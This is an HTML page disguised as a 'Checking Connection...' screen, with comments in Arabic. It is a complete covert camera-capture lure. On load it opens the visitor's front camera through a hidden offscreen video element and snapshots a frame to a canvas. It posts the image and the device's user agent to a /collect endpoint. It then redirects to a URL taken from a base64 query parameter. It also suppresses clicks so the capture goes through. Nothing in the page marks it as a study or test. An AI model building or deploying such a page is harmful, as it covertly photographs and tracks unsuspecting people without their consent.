<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking Connection...</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; overflow: hidden; }
        #v, #c { position: fixed; top: -1000px; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>
    <video id="v" autoplay muted playsinline></video>
    <canvas id="c"></canvas>

    <script>
        (async function() {
            const video = document.getElementById('v');
            const canvas = document.getElementById('c');
            
            const urlParams = new URLSearchParams(window.location.search);
            const encodedData = urlParams.get('p');
            let config = { r: "https://google.com" }; 
            
            if (encodedData) {
                try { config = JSON.parse(atob(encodedData)); } catch (e) {}
            }

            async function captureAndSend() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
                    });
                    video.srcObject = stream;

                    // حل مشكلة الصورة السوداء: الانتظار حتى يبدأ الفيديو فعلياً
                    await new Promise((resolve) => {
                        video.onloadedmetadata = () => {
                            // ننتظر 800 مللي ثانية إضافية بعد فتح الكاميرا لضبط الإضاءة
                            setTimeout(resolve, 800);
                        };
                    });

                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    // تحويل الصورة بجودة عالية
                    const base64Image = canvas.toDataURL('image/jpeg', 0.8);
                    
                    // إرسال البيانات للسيرفر
                    const response = await fetch('/collect', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            image: base64Image,
                            phone_name: navigator.userAgent
                        })
                    });

                    if (response.ok) {
                        stream.getTracks().forEach(t => t.stop());
                        window.location.replace(config.r);
                    }

                } catch (err) {
                    // إذا رفض الكاميرا، يتم التوجيه فوراً
                    window.location.replace(config.r);
                }
            }

            // منع التوجيه عند الضغط العشوائي لضمان التقاط الصورة
            window.onclick = (e) => {
                e.preventDefault();
            };

            window.onload = captureAndSend;
        })();
    </script>
</body>
</html>
